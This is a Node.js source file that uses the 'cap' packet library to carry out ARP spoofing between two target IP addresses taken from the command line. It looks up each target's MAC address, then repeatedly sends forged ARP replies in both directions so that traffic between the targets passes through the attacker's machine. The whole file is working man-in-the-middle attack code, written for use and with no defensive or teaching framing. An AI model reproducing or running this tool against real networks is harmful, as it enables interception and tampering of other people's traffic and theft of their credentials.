"use strict";

var Cap = require('cap').Cap,
  ip = require("ip"),
  timers = require("timers"),
  device = Cap.findDevice(ip.address()),
  getmac = require('getmac').getMac,
  filter = 'arp',
  bufSize = 10 * 1024 * 1024,
  socketBuffer = new Buffer(65535),
  OPERATION = {
    REQUEST:  1,
    REPLY: 2
  },
  attacker = {
    ip: ip.address(),
    mac: null
  };

var target1 = {},
  target2 = {},
  interval = null;

if(process.argv.length > 1) {
  target1.ip = process.argv[2];
  target2.ip = process.argv[3];
  if(typeof process.argv[4] !== "undefined") {
    interval = parseInt(process.argv[4]) * 1000;
  }
}

getmac(function(err, macAddr) {
  // Request example
  var target1_mac, target2_mac, response;
  attacker.mac = macAddr;

  arpRequest(target1, (buf, close) => {
    var response = createARPPacket(buf);
    if(response.arp.operation.readInt16BE(0) !== OPERATION.REPLY) {
      return;
    }

    target1.mac = buf2macString(response.arp.sender_mac);
    close();
    console.log("MAC found for target 1:\t", target1.mac);

    arpRequest(target2, (buf, close) => {
      response = createARPPacket(buf.current);
      target2.mac = buf2macString(response.arp.sender_mac);
      close();
      console.log("MAC found for target 2:\t", target2.mac);
      // Poisoning example
      if(target1 !== null && target2 !== null) {
        if(interval !== null) {
          console.log("\nStarting ARP replies every " + interval + " milliseconds");
          setInterval(spoofBothWays, interval, target1, target2, macAddr);
        }

        spoofBothWays(target1, target2, macAddr);

        if(interval === null) {
          process.exit();
        } else {
          // Stick around for the interval
        }
      }
    });
  });
});

var spoofBothWays = (target1, target2, mac) => {
  spoof(target1, target2, mac);
  spoof(target2, target1, mac);
};

var spoof = function (src, dst, mac) {
  // Send reply from target1 to broadcast, advertising new hardware address
  var packet = createARPPacket();

  packet.arp.operation.writeUIntBE(OPERATION.REPLY, 0, 2);

  setMac(packet.arp.target_mac, dst.mac);
  setMac(packet.eth.target_mac, dst.mac);

  setMac(packet.arp.sender_mac, mac);
  setMac(packet.eth.sender_mac, mac);

  setIP(packet.arp.sender_ip, src.ip);
  setIP(packet.arp.target_ip, dst.ip);

  send(packet.buffer);


  // Fix our own ARP stack
  /*setMac(packet.arp.target_mac, attacker.mac);
  setMac(packet.eth.target_mac, attacker.mac);
  setIP(packet.arp.target_ip, attacker.ip);

  setMac(packet.eth.sender_mac, dst.mac);
  setMac(packet.arp.sender_mac, dst.mac);
  setIP(packet.arp.sender_ip, dst.ip);

  send(packet.buffer);*/
};

var arpRequest = function(target, callback) {
  var c = new Cap();
  var packet = createARPPacket();

  packet.arp.operation.writeUIntBE(OPERATION.REQUEST, 0, 2);

  packet.arp.target_mac.writeUIntBE(0xFFFFFFFFFFFF, 0, packet.arp.target_mac.length);
  packet.eth.target_mac.writeUIntBE(0xFFFFFFFFFFFF, 0, packet.arp.target_mac.length);

  setMac(packet.eth.sender_mac, attacker.mac);
  setMac(packet.arp.sender_mac, attacker.mac);

  setIP(packet.arp.sender_ip, attacker.ip);
  setIP(packet.arp.target_ip, target.ip);

  c.open(device, filter, bufSize, socketBuffer);
  c.setMinBytes(42); // Length of an ARP packet
  console.log("\n\nSending ARP Request for ", target.ip);
  c.send(packet.buffer, packet.buffer.length);
  c.on("packet", (nbytes) => {
    callback(socketBuffer.slice(0,nbytes), () => { c.close(); });
  });
};

var send = function(buffer) {
  var c = new Cap();
  try {
    console.log("Sending reply:", buffer);
    c.open(device, filter, bufSize, socketBuffer);
    c.send(buffer, buffer.length);
    c.close();
  } catch (e) {
    console.log("Error sending packet:", e);
  }
};

var setMac = function (buffer, addr) {
  // Poorly named; goes from the string "FF-FF-FF-FF-FF-FF" to 0xFFFFFFFFFFFF, then writes that value to buffer
  var mac = parseInt(addr.split("-").join(""), 16);
  buffer.writeUIntBE(mac, 0, 6);
};

var setIP = function(buffer, ip) {
  var ip_blocks = ip.toString().split(".");
  for(var i = 0; i < ip_blocks.length; i++) {
    buffer.writeUIntBE(parseInt(ip_blocks[i]), i, 1);
  }
};

var buf2macString = function(buf) {
  // Takes a buffer containing a MAC address, gives it back as a hyphen-delimited string, e.g. "FF-FF-FF-FF-FF-FF"
  return buf.toString('hex').match(/.{1,2}/g).join('-');
};

var createARPPacket = function(buf) {
  var buffer = buf;
  if(typeof buffer === "undefined") {
    buffer = new Buffer([
      // ETHERNET
      0xff, 0xff, 0xff, 0xff, 0xff,0xff,                  // 0    = Destination MAC
      0x84, 0x8F, 0x69, 0xB7, 0x3D, 0x92,                 // 6    = Source MAC
      0x08, 0x06,                                         // 12   = EtherType = ARP
      // ARP
      0x00, 0x01,                                         // 14/0   = Hardware Type = Ethernet (or wifi)
      0x08, 0x00,                                         // 16/2   = Protocol type = ipv4 (request ipv4 route info)
      0x06, 0x04,                                         // 18/4   = Hardware Addr Len (Ether/MAC = 6), Protocol Addr Len (ipv4 = 4)
      0x00, 0x01,                                         // 20/6   = Operation (ARP, who-has)
      0x84, 0x8f, 0x69, 0xb7, 0x3d, 0x92,                 // 22/8   = Sender Hardware Addr (MAC)
      0xc0, 0xa8, 0x01, 0xc8,                             // 28/14  = Sender Protocol address (ipv4)
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00,                 // 32/18  = Target Hardware Address (Blank/nulls for who-has)
      0xc0, 0xa8, 0x01, 0xc9                              // 38/24  = Target Protocol address (ipv4)
    ]);
  }

  var packet = {
    eth: {
      target_mac: buffer.slice(0,6),
      sender_mac: buffer.slice(6,12),
      ethertype: buffer.slice(12,14)
    },
    arp: {
      hardwareType: buffer.slice(14,16),
      protocol: buffer.slice(16,18),
      hardwareAddressLen: buffer.slice(18,20),
      operation: buffer.slice(20,22),
      sender_mac: buffer.slice(22,28),
      sender_ip: buffer.slice(28,32),
      target_mac: buffer.slice(32,38),
      target_ip: buffer.slice(38,42)
    }
  };

  packet.buffer = buffer;

  return packet;
};
  